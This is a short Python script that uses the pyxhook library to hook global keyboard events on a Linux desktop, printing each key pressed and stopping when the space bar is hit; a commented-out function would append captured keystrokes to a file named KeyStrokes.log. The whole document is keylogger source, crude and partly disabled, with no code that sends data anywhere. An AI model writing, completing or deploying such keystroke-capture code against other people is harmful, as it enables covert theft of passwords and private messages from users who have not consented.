#!/usr/bin/python3

import pyxhook
import time
import os

def KeyEvent(event):
    global Keys
    Keys = []
    Keys.append(event.Key)
    print(Keys)
    
    if event.Ascii == 32:
        #exit(0)        
        global runn
        runn = False

''' ***404 NOT FOUND ))***
def KeyCapture(Keys):
    with open('KeyStrokes.log', 'a') as f:
        for key in Keys:
            kS = str(key).replace("'", "")
            if kS.find('space') > 0:
                f.write('\n')
            elif kS.find('Key') == -1:
                f.write(kS)
'''

Hk = pyxhook.HookManager()
Hk.KeyDown = KeyEvent
Hk.HookKeyboard()
Hk.start()

runn = True
while runn:
    time.sleep(10)

